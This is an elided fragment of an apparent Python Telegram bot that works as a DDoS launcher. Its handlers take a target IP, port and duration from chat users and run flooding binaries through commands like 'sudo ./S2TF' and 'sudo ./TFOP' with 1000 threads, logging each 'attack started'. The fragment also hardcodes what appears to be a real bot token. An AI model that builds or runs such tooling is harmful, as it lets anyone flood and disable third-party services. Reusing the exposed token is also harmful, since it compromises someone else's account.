...
TOKEN = '7475040161:AAELXxECQ6eGhMG1XM6uYZ1LDjsTcua3uJs'  # Replace with your actual bot token
...
def TF_command(message):
    ...
    try:
        ...
        logging.info(f"Attack started by {user_name}: sudo ./S2TF {target_ip} {target_port} {default_duration} 1000")
...
async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"sudo ./TFOP {target_ip} {target_port} {duration} 1000"
